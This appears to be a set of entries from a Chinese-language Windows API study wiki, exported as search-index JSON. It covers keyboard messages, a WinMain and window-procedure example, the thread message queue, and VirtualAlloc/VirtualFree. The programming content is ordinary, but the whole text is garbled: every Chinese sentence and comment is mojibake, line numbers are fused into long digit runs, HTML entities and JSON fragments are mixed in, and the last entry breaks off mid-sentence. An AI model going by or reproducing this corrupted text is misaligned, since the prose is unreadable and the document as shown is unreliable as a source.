ï¼Œè¿™é€šå¸¸å¯¹åº”äºæŒ‰é”®ç”Ÿæˆçš„å­—ç¬¦ï¼Œè€ƒè™‘äº†é”®ç›˜å¸ƒå±€ã€æŒ‰ä¸‹çš„æ˜¯å¤§å†™é”®è¿˜æ˜¯å°å†™é”®ã€æ˜¯å¦åŒæ—¶æŒ‰ä¸‹äº†Shifté”®ç­‰ã€‚WM_CHARé€‚åˆå¤„ç†å¯æ‰“å°å­—ç¬¦çš„è¾“å…¥ï¼Œå¦‚æ–‡æœ¬è¾“å…¥ã€‚ä¸ä¼šä¸ºéå­—ç¬¦é”®ç”ŸæˆWM_CHARæ¶ˆæ¯ã€‚ä¸WM_KEYDOWNä¸åŒï¼ŒWM_CHARä¸å…³å¿ƒæŒ‰é”®çš„ç‰©ç†ä½ç½®æˆ–ç‰¹å®šçš„ç¡¬ä»¶é”®ç ã€‚æ€»çš„æ¥è¯´ï¼ŒWM_KEYDOWNæ¶ˆæ¯æ›´å¤šåœ°å…³æ³¨ç‰©ç†é”®ç›˜ä¸Šçš„é”®çš„çŠ¶æ€ï¼Œè€ŒWM_CHARæ¶ˆæ¯å…³æ³¨çš„æ˜¯è¿™äº›æŒ‰é”®æ“ä½œæ‰€äº§ç”Ÿçš„å­—ç¬¦ã€‚åœ¨ç¼–å†™éœ€è¦å¤„ç†æ–‡æœ¬è¾“å…¥çš„åº”ç”¨ç¨‹åºæ—¶ï¼Œé€šå¸¸ä¼šæ›´å¤šåœ°å…³æ³¨WM_CHARæ¶ˆæ¯ï¼Œå› ä¸ºå®ƒæä¾›äº†å¯¹åº”äºç”¨æˆ·æŒ‰é”®çš„å®é™…å­—ç¬¦ã€‚è€ŒWM_KEYDOWNåˆ™é€‚ç”¨äºé‚£äº›éœ€è¦å¤„ç†éå­—ç¬¦é”®ï¼ˆå¦‚æ–¹å‘é”®ã€åŠŸèƒ½é”®ç­‰ï¼‰çš„åœºæ™¯ã€‚ æ›´å¤šçš„æ¶ˆæ¯ç¤ºä¾‹ å¤„ç†è¿‡çš„æ¶ˆæ¯è¦return 0ï¼Œè¡¨ç¤ºè¿™ä¸ªæ¶ˆæ¯å·²ç»å¤„ç†è¿‡äº†ã€‚å› ä¸ºç³»ç»Ÿå†…éƒ¨å¾ˆå¤šå‡½æ•°åœ¨è°ƒæ¥è°ƒå»ï¼Œçª—å£è¿‡ç¨‹å‡½æ•°åªæ˜¯å…¶ä¸­çš„ä¸€ç¯ï¼Œreturn 0è¡¨ç¤ºè¿™ä¸ªæ¶ˆæ¯å¤„ç†è¿‡äº†ã€‚ ä¸‹é¢è¿™ä¸ªç¨‹åºéœ€è¦ç”¨åˆ°è‡ªå·±å°è£…çš„DbgPrintfï¼Œä¸‹é¢çš„ä»£ç ä¸­çœç•¥äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153#include &quot;OutputDebugStringF.h&quot;#include &lt;Windows.h&gt;LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º if (hWnd == NULL) &#123; DbgPrintf(&quot;Error: %d&quot;, GetLastError()); return 0; &#125; ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; DbgPrintf(&quot;Error: %d&quot;, GetLastError()); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; // çª—å£åˆ›å»ºæ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_CREATE: &#123; DbgPrintf(&quot;WM_CREATE %d %d &quot;, wParam, lParam); // wParam: æœªä½¿ç”¨ // lParam: æŒ‡å‘ä¸€ä¸ªCREATESTRUCTç»“æ„çš„æŒ‡é’ˆ //Defines the initialization parameters passed to the window procedure of an application. //These members are identical to the parameters of the CreateWindowEx function. CREATESTRUCT* createst = (CREATESTRUCT*)lParam; DbgPrintf(&quot;CREATESTRUCT %s &quot;, createst-&gt;lpszClass); //CREATESTRUCTç»“æ„é‡Œçš„å‚æ•°éƒ½å¯ä»¥å¯¹åº”åˆ°CreateWindowæˆ–CreateWindowExå‡½æ•°çš„å‚æ•° return 0; &#125; // çª—å£ç§»åŠ¨æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_MOVE: &#123; DbgPrintf(&quot;WM_MOVE %d %d &quot;, wParam, lParam); // wParam: æœªä½¿ç”¨ // lParam: åŒ…å«çª—å£æ–°ä½ç½®çš„xå’Œyåæ ‡çš„ä½ä½å’Œé«˜ä½ POINTS points = MAKEPOINTS(lParam); // MAKEPOINTSå®å°†lParamè½¬æ¢ä¸ºåŒ…å«xå’Œyåæ ‡çš„POINTSç»“æ„ DbgPrintf(&quot;X Y %d %d &quot;, points.x, points.y); return 0; &#125; // çª—å£å¤§å°æ”¹å˜æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_SIZE: &#123; DbgPrintf(&quot;WM_SIZE %d %d &quot;, wParam, lParam); // wParam: è°ƒæ•´çª—å£å¤§å°çš„ç±»å‹ï¼ˆå¦‚SIZE_MAXIMIZEDã€SIZE_MINIMIZEDï¼‰ // lParam: æ–°çš„å®½åº¦åœ¨ä½ä½ï¼Œæ–°çš„é«˜åº¦åœ¨é«˜ä½ int newWidth = (int)(short)LOWORD(lParam); // LOWORDå®è·å–lParamçš„ä½16ä½ï¼Œè¡¨ç¤ºå®½åº¦ã€‚è½¬æ¢æ–¹æ³•ç›´æ¥ä»MSDNæŠ„çš„ int newHeight = (int)(short)HIWORD(lParam); // HIWORDå®è·å–lParamçš„é«˜16ä½ï¼Œè¡¨ç¤ºé«˜åº¦ã€‚è½¬æ¢æ–¹æ³•ç›´æ¥ä»MSDNæŠ„çš„ DbgPrintf(&quot;WM_SIZE %d %d &quot;, newWidth, newHeight); return 0; &#125; // çª—å£å…³é—­æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_DESTROY: &#123; DbgPrintf(&quot;WM_DESTROY %d %d &quot;, wParam, lParam); // wParam: æœªä½¿ç”¨ // lParam: æœªä½¿ç”¨ PostQuitMessage(0); return 0; &#125; // é”®ç›˜é”®é‡Šæ”¾æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_KEYUP: &#123; DbgPrintf(&quot;WM_KEYUP %d %d &quot;, wParam, lParam); // wParam: è¢«é‡Šæ”¾é”®çš„è™šæ‹Ÿé”®ç  // lParam: æŒ‰é”®çš„é‡å¤æ¬¡æ•°ã€æ‰«æç ç­‰é™„åŠ ä¿¡æ¯ return 0; &#125; // é”®ç›˜é”®æŒ‰ä¸‹æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_KEYDOWN: &#123; DbgPrintf(&quot;WM_KEYDOWN %d %d &quot;, wParam, lParam); // wParam: è¢«æŒ‰ä¸‹é”®çš„è™šæ‹Ÿé”®ç  // lParam: æŒ‰é”®çš„é‡å¤æ¬¡æ•°ã€æ‰«æç ç­‰é™„åŠ ä¿¡æ¯ return 0; &#125; // é¼ æ ‡å·¦é”®æŒ‰ä¸‹æ—¶è§¦å‘çš„æ¶ˆæ¯ case WM_LBUTTONDOWN: &#123; DbgPrintf(&quot;WM_LBUTTONDOWN %d %d &quot;, wParam, lParam); // wParam: åŒ…å«äº†å…³äºæŒ‰é”®çŠ¶æ€çš„ä¿¡æ¯ï¼ˆå¦‚æ˜¯å¦åŒæ—¶æŒ‰ä¸‹äº†æ§åˆ¶é”®æˆ–è€…ç§»ä½é”®ï¼‰ // lParam: é¼ æ ‡ç‚¹å‡»ä½ç½®çš„xå’Œyåæ ‡çš„ä½ä½å’Œé«˜ä½ POINTS points = MAKEPOINTS(lParam); DbgPrintf(&quot;WM_LBUTTONDOWN %d %d &quot;, points.x, points.y); return 0; &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; å°ç»“ èƒ½äº§ç”Ÿæ¶ˆæ¯çš„å››ç§æƒ…å†µï¼šé¼ æ ‡ï¼Œé”®ç›˜ï¼Œå…¶ä»–çš„åº”ç”¨ç¨‹åºï¼Œæ“ä½œç³»ç»Ÿçš„å†…æ ¸ç¨‹åº MSGä¸­çš„wParamå’ŒlParamæ˜¯æ¶ˆæ¯çš„é™„åŠ ä¿¡æ¯ï¼Œå…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹uMsg æƒ³è¦å¾—åˆ°é”®ç›˜æ¶ˆæ¯çš„å­—ç¬¦æ¶ˆæ¯ï¼Œéœ€è¦è°ƒç”¨TranslateMessageå°†è™šæ‹Ÿé”®æ¶ˆæ¯è½¬æ¢ä¸ºå­—ç¬¦æ¶ˆæ¯ åœ¨å›è°ƒå‡½æ•°ä¸­ç”¨switchçš„caseå»å¤„ç†è‡ªå·±å…³å¿ƒçš„æ¶ˆæ¯ï¼Œå…¶ä½™çš„äº¤ç»™é»˜è®¤å›è°ƒå‡½æ•°DefWindowProcå¤„ç† è‡ªå·±å¤„ç†çš„æ¶ˆæ¯å¤„ç†å®Œäº†è¦return 0ï¼Œè¡¨ç¤ºè¿™ä¸ªæ¶ˆæ¯å¤„ç†è¿‡äº†ã€‚å› ä¸ºæˆ‘ä»¬è‡ªå·±å†™çš„çª—å£å›è°ƒå‡½æ•°åªæ˜¯æ•´ä¸ªwindowsç¨‹åºä¸­é—´çš„ä¸€éƒ¨åˆ†"},{"title":"æ¶ˆæ¯é˜Ÿåˆ—","path":"/wiki/Windows_API/æ¶ˆæ¯é˜Ÿåˆ—.html","content":"å‰è¨€ windowsç³»ç»Ÿï¼ˆè§†çª—æ“ä½œç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªåŸºäºçª—å£çš„æ“ä½œç³»ç»Ÿï¼Œç”¨æˆ·çš„äº¤äº’ä¸»è¦å‘ç”Ÿåœ¨å„ç§çª—å£ä¸Šã€‚ä¾‹å¦‚ï¼Œåœ¨è®°äº‹æœ¬ä¸­è¾“å…¥æ–‡å­—ï¼Œåœ¨èœå•æ ç‚¹å‡»ï¼Œåœ¨å³ä¸Šè§’çš„å…³é—­æŒ‰é’®ç‚¹å‡»ï¼Œæˆ–å¯¹çª—å£è¿›è¡Œå…¶ä»–é¼ æ ‡æˆ–é”®ç›˜æ“ä½œç­‰ã€‚é‚£ä¹ˆï¼Œnotepadçª—å£æ˜¯å¦‚ä½•æ¥æ”¶åˆ°ç”¨æˆ·çš„æ¶ˆæ¯çš„ï¼ˆé¼ æ ‡æ“ä½œï¼Œé”®ç›˜ç­‰ï¼‰ï¼Ÿä¸ºä½•ç”¨æˆ·åœ¨notepadä¸Šçš„æ“ä½œï¼Œåšå‡ºååº”çš„æ˜¯notepadè€Œä¸æ˜¯éš”å£çš„é£é¸½ï¼Ÿ äº‹ä»¶ æ¶ˆæ¯ åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œäº‹ä»¶æ˜¯ä¸€ä¸ªâ€œåŠ¨ä½œâ€ï¼Œè¿™ä¸ªåŠ¨ä½œå¯èƒ½æ˜¯ç”¨æˆ·æ“ä½œåº”ç”¨ç¨‹åºäº§ç”Ÿçš„ï¼Œæ¯”å¦‚ç‚¹å‡»é¼ æ ‡æˆ–æ•²å‡»é”®ç›˜ï¼Œä¹Ÿå¯èƒ½æ˜¯æ“ä½œç³»ç»Ÿè‡ªå·±äº§ç”Ÿçš„ï¼Œæ¯”å¦‚ç³»ç»Ÿå®šæ—¶å™¨çš„è§¦å‘ã€‚è€Œæ¶ˆæ¯ï¼Œå°±æ˜¯ç”¨æ¥æè¿°è¿™äº›â€œåŠ¨ä½œçš„â€ï¼Œæ¯”å¦‚ï¼šè¿™ä¸ªåŠ¨ä½œæ˜¯ä»€ä¹ˆæ—¶å€™äº§ç”Ÿçš„ï¼Ÿå“ªä¸ªåº”ç”¨ç¨‹åºäº§ç”Ÿçš„ï¼Ÿåœ¨ä»€ä¹ˆä½ç½®äº§ç”Ÿçš„ç­‰ç­‰ã€‚æ¶ˆæ¯å°±æ˜¯å¯¹äº‹ä»¶çš„ä¸€ç§å°è£…ã€‚åœ¨Windowsç³»ç»Ÿä¸­ï¼Œæ¶ˆæ¯ç”¨MSGç»“æ„ä½“æ¥æè¿°è¯¥æ¶ˆæ¯çš„ç›¸å…³ä¿¡æ¯ï¼š 123456789101112131415typedef struct tagMSG&#123; HWND hwnd; // è¡¨ç¤ºæ¶ˆæ¯æ‰€å±çš„çª—å£ï¼Œçª—å£å¥æŸ„ï¼Œå®é™…å°±æ˜¯çª—å£çš„ä¸€ä¸ªç¼–å· UINT message; // æ¶ˆæ¯çš„æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºæ˜¯ä»€ä¹ˆç±»å‹çš„æ¶ˆæ¯ï¼Œæ˜¯ä¸€ä¸ªæ•°å€¼ï¼Œæ•°å€¼ä¸ä¾¿äºè®°å½•ï¼Œæ‰€ä»¥ç”¨å®å¦‚WM_PAINTã€WM_QUITç­‰æ¥ä¸æ•°å€¼å¯¹åº” WPARAM wParam; // ä¸æ¶ˆæ¯ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹ã€‚ LPARAM lParam; // ä¸æ¶ˆæ¯ç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚å…·ä½“å«ä¹‰å–å†³äºæ¶ˆæ¯çš„ç±»å‹ã€‚ DWORD time; // æ¶ˆæ¯è¢«åˆ›å»ºçš„æ—¶é—´ï¼ˆç³»ç»Ÿå¯åŠ¨åçš„æ¯«ç§’æ•°ï¼‰ã€‚ POINT pt; // æ¶ˆæ¯å‘ç”Ÿæ—¶çš„é¼ æ ‡ä½ç½®ï¼Œç›¸å¯¹äºå·¦ä¸Šè§’å±å¹•(0,0)çš„åæ ‡ã€‚ DWORD lPrivate; // ç§æœ‰å­—æ®µï¼Œç”¨äºæ“ä½œç³»ç»Ÿå†…éƒ¨ä½¿ç”¨ï¼Œåº”ç”¨ç¨‹åºé€šå¸¸ä¸ä½¿ç”¨æ­¤å­—æ®µã€‚&#125; MSG, *PMSG, *NPMSG, *LPMSG;//å…‰æœ‰messageå­—æ®µä¸è¶³ä»¥æè¿°æ¶ˆæ¯ã€‚æ¯”å¦‚ç”¨æˆ·ç”¨é¼ æ ‡ç‚¹å‡»äº†ä¸€ä¸‹ï¼Œmessageåªèƒ½è®°å½•æ˜¯é¼ æ ‡è¿˜æ˜¯é”®ç›˜æ¶ˆæ¯//æ— æ³•è®°å½•æ›´å¤šçš„ç»†èŠ‚ï¼Œæ¯”å¦‚é¼ æ ‡å·¦é”®ç‚¹çš„è¿˜æ˜¯å³é”®ç‚¹çš„ï¼Œç‚¹äº†å‡ æ¬¡//å› æ­¤ï¼Œwindowsè¿˜ç”¨ä¸¤ä¸ªå‚æ•°wParamå’ŒlParamç”¨äºæè¿°é™„ä»¶ä¿¡æ¯ã€‚//æ‰€ä»¥ï¼ŒwParamå’ŒlParamå‚æ•°çš„å«ä¹‰ä¼šéšç€ä¸åŒçš„messageè€Œä¸åŒ åŸå§‹è‰ç¨¿ï¼š Windowsæ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ï¼ŒåŸºäºæ¶ˆæ¯çš„æ“ä½œç³»ç»Ÿã€‚ç”¨æˆ·çš„ä»»ä½•æ“ä½œï¼Œå¦‚ç‚¹å‡»é¼ æ ‡æˆ–æŒ‰é”®ï¼Œéƒ½è¢«è§†ä¸ºäº‹ä»¶ï¼Œæ“ä½œç³»ç»Ÿä¼šè®°å½•è¿™äº›æ“ä½œï¼Œå°†å®ƒä»¬å­˜å‚¨åˆ°ä¸€ä¸ªç»“æ„ä½“ä¸­ï¼Œè¿™ä¸ªç»“æ„ä½“å°±æ˜¯æ¶ˆæ¯ã€‚æ¶ˆæ¯æ˜¯Windowsæ“ä½œç³»ç»Ÿä¸­ç”¨äºè¡¨ç¤ºç”¨æˆ·æ“ä½œæˆ–å…¶ä»–ç³»ç»Ÿäº‹ä»¶çš„ç»“æ„ä½“ã€‚ æ¶ˆæ¯é˜Ÿåˆ— ç”¨æˆ·åœ¨åº”ç”¨å±‚æ‰€çœ‹åˆ°çš„æ‰€æœ‰çª—å£ï¼Œå®ƒå®é™…ä¸Šéƒ½åœ¨å†…æ ¸å±‚çš„win32k.sysä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨åº”ç”¨å±‚çš„æ¯ä¸ªçª—å£åœ¨å†…æ ¸å±‚éƒ½å¯¹åº”ä¸€ä¸ªçª—å£å¯¹è±¡ã€‚çº¿ç¨‹åœ¨å†…æ ¸ä¸­å¯¹åº”ä¸€ä¸ªçº¿ç¨‹å†…æ ¸å¯¹è±¡ï¼ˆç»“æ„ä½“ï¼‰ï¼Œå¦‚æœè¿™ä¸ªçº¿ç¨‹åˆ›å»ºäº†ä¸€ä¸ªçª—å£ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹ä¸­å°±ä¼šæœ‰ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆå…·ä½“çš„æ•°æ®ç»“æ„è¦ä¸­çº§ç­æ—¶æ‰èƒ½ç»†è®²ï¼Œç›®å‰å°±è¿™ä¹ˆç†è§£ï¼‰ã€‚è¿™ä¸ªé˜Ÿåˆ—ç”¨äºæ¥æ”¶æ¶ˆæ¯ã€‚ç”¨æˆ·å¯¹çª—å£çš„æ“ä½œï¼Œå¦‚ç‚¹å‡»é¼ æ ‡æˆ–æŒ‰ä¸‹é”®ç›˜ï¼Œå…¶ä»–è¿›ç¨‹é€šè¿‡APIå‘ç”Ÿçš„æ¶ˆæ¯ï¼Œæœ€ç»ˆéƒ½ä¼šå­˜å‚¨åˆ°ç›¸åº”çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚ ä¸€ä¸ªçº¿ç¨‹å³ä½¿åˆ›å»ºäº†å¤šä¸ªçª—å£ï¼Œè¿˜æ˜¯åªæœ‰ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ã€‚å¦‚æœæ²¡åˆ›å»ºçª—å£ï¼Œå°±æ²¡æœ‰æ¶ˆæ¯é˜Ÿåˆ—ã€‚ æ¶ˆæ¯çš„äº§ç”Ÿå’Œå¤„ç† å‡è®¾ç”¨æˆ·åœ¨dbgviewçª—å£å³ä¸Šè§’çš„å…³é—­æŒ‰é’®ä¸ŠæŒ‰ä¸‹é¼ æ ‡å·¦é”®ï¼Œè¿™ä¸ªæ“ä½œé¦–å…ˆè¢«æ“ä½œç³»ç»Ÿæ•æ‰åˆ°ï¼Œå°†è¿™ä¸ªå…³é—­ï¼ˆé¼ æ ‡å·¦é”®ç‚¹å‡»ï¼Œç‚¹å‡»æ—¶çš„åæ ‡ç­‰ä¿¡æ¯ï¼‰æ“ä½œå°è£…ä¸ºæ¶ˆæ¯ï¼ˆä¸€ä¸ªç»“æ„ä½“ï¼‰ã€‚è¿™ä¸ªæ¶ˆæ¯é¦–å…ˆä¼šè¿›åˆ°ç³»ç»Ÿé˜Ÿåˆ—ä¸­ï¼Œç„¶åç³»ç»Ÿä¾æ¬¡å¤„ç†è¿™äº›æ¶ˆæ¯ï¼Œæ ¹æ®æ¶ˆæ¯ä¸­çš„åæ ‡å»å†…æ ¸éå†æ‰€æœ‰çª—å£å¯¹è±¡ï¼Œæ¥ç¡®å®šå¯¹åº”çš„çª—å£å¯¹è±¡ã€‚çª—å£å¯¹è±¡ç»“æ„ä½“ï¼ˆWinObjectï¼‰ä¸­æœ‰ä¸€ä¸ªå­—æ®µæ ‡è¯†äº†è¿™ä¸ªçª—å£å±äºå“ªä¸ªçº¿ç¨‹ã€‚éšåï¼Œè¿™ä¸ªæ¶ˆæ¯å°±è¢«æ”¾ç½®åœ¨å¯¹åº”çº¿ç¨‹çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚ æ³¨æ„ï¼šä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¸€ä¸ªçº¿ç¨‹å¯ä»¥æœ‰å¤šä¸ªçª—å£å¯¹è±¡ã€‚ä½†æ¯ä¸ªçª—å£å¯¹è±¡åªå±äºä¸€ä¸ªçº¿ç¨‹ã€‚"},{"title":"ç§æœ‰å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾","path":"/wiki/Windows_API/ç§æœ‰å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾.html","content":"å‰è¨€ æ˜ç™½äº†è™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„å…³ç³»åï¼Œç°åœ¨æ¥å­¦ä¹ å†…å­˜ç®¡ç†ç›¸å…³çš„apiã€‚ ç‰©ç†å†…å­˜åˆ†ä¸ºä¸¤ç§ï¼š ç§æœ‰å†…å­˜ï¼ˆPrivateï¼‰ï¼šè¯¥ç‰©ç†é¡µä¸ºè¿›ç¨‹ç§æœ‰ï¼Œè¿›ç¨‹ç‹¬äº«è¯¥ç‰©ç†é¡µ å…±äº«å†…å­˜ï¼ˆMappedï¼‰ï¼šè¯¥ç‰©ç†é¡µå¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹å…±äº«ä½¿ç”¨ ç§æœ‰å†…å­˜é€šè¿‡VirtualAlloc/VirtualAllocExå‡½æ•°ç”³è¯·ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åœ¨åº•å±‚å®ç°ä¸€æ ·ã€‚åªä¸è¿‡VirtualAllocExå¯ä»¥ä¸ºå…¶ä»–è¿›ç¨‹ç”³è¯·å†…å­˜ã€‚ å…±äº«å†…å­˜é€šè¿‡CreateFileMappingå‡½æ•°æ˜ å°„ ç§æœ‰å†…å­˜çš„ç”³è¯·å’Œé‡Šæ”¾ ç”³è¯· VirtualAlloc 123456LPVOID VirtualAlloc( [in, optional] LPVOID lpAddress, // è¦åˆ†é…çš„å†…å­˜åŒºåŸŸçš„åœ°å€ [in] SIZE_T dwSize, // åˆ†é…çš„å¤§å° [in] DWORD flAllocationType, // åˆ†é…çš„ç±»å‹ [in] DWORD flProtect // è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§); lpAddressï¼šè¦ç”³è¯·çš„å†…å­˜åœ°å€ã€‚ å¦‚æœç”³è¯·å·²è¢«å ç”¨çš„åœ°å€ï¼Œä¼šç”³è¯·å¤±è´¥ NULLï¼šè®©ç³»ç»Ÿè‡ªè¡Œå†³å®šåœ¨ä»€ä¹ˆåœ°æ–¹åˆ†é… dwSizeï¼šç”³è¯·å¤šå¤§çš„å†…å­˜ MSDNä¸Šè™½è¯´è¿™ä¸ªå‚æ•°å•ä½æ˜¯å­—èŠ‚ï¼Œä½†å»ºè®®ä»¥é¡µä¸ºå•ä½è¿›è¡Œç”³è¯·ï¼Œ4KBï¼Œåå…­è¿›åˆ¶æ˜¯0x1000ï¼Œåè¿›åˆ¶4096 flAllocationTypeï¼šåˆ†é…çš„ç±»å‹ MEM_COMMITï¼ˆæäº¤ï¼‰ï¼šä¸ä½†å ç”¨çº¿æ€§åœ°å€ï¼Œå¹¶ä¸”æŒ‚ä¸Šç‰©ç†é¡µã€‚ä¸ä»…ä¿ç•™çº¿æ€§åœ°å€ç©ºé—´ï¼Œè¿˜ä¼šå°†å…¶æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä¸Šã€‚ MEM_RESERVEï¼ˆä¿ç•™ï¼‰ï¼šå ç”¨çº¿æ€§åœ°å€ï¼Œä½†æ²¡æŒ‚ç‰©ç†é¡µã€‚ä»…ä¿ç•™äº†çº¿æ€§åœ°å€ç©ºé—´ï¼Œä½†å¹¶ä¸å®é™…åˆ†é…ç‰©ç†å†…å­˜ã€‚ flProtect:ç”³è¯·çš„ç‰©ç†é¡µçš„å±æ€§ï¼Œå…·ä½“æŸ¥Memory Protection Constants PAGE_EXECUTEï¼šè¯¥ç‰©ç†é¡µå¯æ‰§è¡Œ PAGE_EXECUTE_READï¼šå¯è¯»å¯æ‰§è¡Œ PAGE_READONLYï¼šåªè¯» ä¾‹ ç©ºç¨‹åºVirtualAllocç”³è¯·ç§æœ‰å†…å­˜ç©ºç¨‹åºï¼ŒæŸ¥çœ‹å…¶çº¿æ€§åœ°å€åˆ†é…æƒ…å†µ 123456#include &lt;Windows.h&gt;int main()&#123; return 0;&#125; ç”¨VirtualAllocç”³è¯·ä¸€å—å†…å­˜ï¼Œç„¶åå†æ¬¡æŸ¥çœ‹è¯¥è¿›ç¨‹çº¿æ€§åœ°å€åˆ†é…æƒ…å†µ 123456789101112#include &lt;Windows.h&gt;int main()&#123; LPVOID p = VirtualAlloc( NULL, // lpAddress: NULL è¡¨ç¤ºç³»ç»Ÿé€‰æ‹©åˆ†é…çš„åœ°å€ 0x1000 * 2, // dwSize: è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œè¿™é‡Œæ˜¯ 0x1000ï¼ˆå³4KBï¼‰çš„ä¸¤å€ MEM_COMMIT, // flAllocationType: å†…å­˜åˆ†é…ç±»å‹ï¼ŒMEM_COMMIT ä¸ä½†å ç”¨çº¿æ€§åœ°å€ï¼Œå¹¶ä¸”æŒ‚ä¸Šç‰©ç†é¡µ PAGE_READWRITE); // flProtect: å†…å­˜é¡µä¿æŠ¤é€‰é¡¹ï¼ŒPAGE_READWRITE è¡¨ç¤ºåˆ†é…çš„é¡µå¯è¯»å†™ return 0;&#125; å¯¹æ¯”ç©ºç¨‹åºçš„VADç»“æ„ï¼Œ0x3a0-0x3a1æ˜¯ç¨‹åºç”¨VirtualAllocç”³è¯·çš„2å—4KBç§æœ‰å†…å­˜ã€‚å¹¶ä¸”commitä¸€åˆ—æ˜¯2ï¼Œå› ä¸ºVirtualAllocçš„ç¬¬ä¸‰ä¸ªå‚æ•°å†™äº†æ˜¯MEM_COMMITï¼Œå¦‚æœå‚æ•°å¡«MEM_RESERVEï¼Œcommitè¿™ä¸€åˆ—ä¸º0ã€‚ é‡Šæ”¾ VirtualFree 12345BOOL VirtualFree( [in] LPVOID lpAddress, // address of region å†…å­˜åŒºåŸŸçš„åœ°å€ [in] SIZE_T dwSize, // size of region å†…å­˜å¤§å° [in] DWORD dwFreeType // operation type); lpAddressï¼šç”³è¯·çš„å†…å­˜ä»å“ªé‡Œå¼€å§‹ dwSizeï¼šé‡Šæ”¾çš„å†…å­˜æœ‰å¤šå¤§ dwFreeTypeï¼šé‡Šæ”¾çš„ç±»å‹ï¼Œæœ‰ä¸¤ä¸ªç±»å‹ MEM_DECOMMITï¼šé‡Šæ”¾ç‰©ç†é¡µï¼Œä½†çº¿æ€§åœ°å€ä¿ç•™ 